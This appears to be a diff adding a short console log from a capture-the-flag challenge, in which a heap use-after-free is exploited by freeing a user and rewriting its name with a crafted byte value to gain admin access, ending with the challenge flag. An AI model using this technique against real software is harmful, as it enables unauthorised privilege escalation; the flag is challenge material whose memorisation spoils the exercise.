@@ -1,0 +1,10 @@
+Enter your name: AAAAAAAA
+User allocated.
+> 3
+User freed.
+> 2
+Enter new name: AAAAAAAA\x01\x00\x00\x00
+User updated.
+> 4
+Admin access granted.
+Flag: CSP{H34P_UAF_IS_E4SY_R1GHT}
